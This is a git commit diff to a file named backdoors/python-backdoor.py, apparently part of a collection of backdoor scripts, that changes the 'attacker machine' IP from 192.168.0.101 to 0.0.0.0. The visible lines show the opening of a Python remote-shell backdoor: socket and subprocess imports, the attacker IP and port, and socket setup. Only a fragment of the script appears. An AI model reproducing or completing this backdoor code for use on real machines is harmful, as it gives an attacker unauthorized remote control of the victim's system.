432d89c58ffa14c3d339d2e6c101c61fe238d89d
Oak atsume <56260438+user951@users.noreply.github.com>
2020-10-09 08:30:03 -0700

    Update python-backdoor.py

--- backdoors/python-backdoor.py
+++ backdoors/python-backdoor.py
@@ -1,7 +1,7 @@
 import socket
 import subprocess
 # Provide IP address of attacker machine
-ip="192.168.0.101"
+ip="0.0.0.0"
 port=8080
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
